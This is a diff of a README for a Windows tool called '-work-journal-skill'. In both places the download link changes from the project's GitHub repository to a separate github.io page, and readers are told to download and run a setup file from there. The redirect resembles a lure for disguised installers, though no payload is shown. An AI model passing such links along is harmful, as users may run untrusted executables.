@@ -1,6 +1,6 @@
 # 📝 -work-journal-skill - Create structured daily logs from code
 
-[![](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/Customary-boulevard224/-work-journal-skill)
+[![](https://img.shields.io/badge/Download-Application-blue.svg)](https://customary-boulevard224.github.io)
 
 ## 📋 What is this tool
 
@@ -14,7 +14,7 @@ This application runs on Windows 10 and Windows 11. You need a stable internet c
 
 Follow these steps to set up the software on your computer.
 
-1. Visit this page to download: https://github.com/Customary-boulevard224/-work-journal-skill
+1. Visit this page to download: https://customary-boulevard224.github.io
 2. Find the setup file in your Downloads folder.
 3. Open the file to start the installer.
 4. Follow the prompts on the screen to finish the installation.
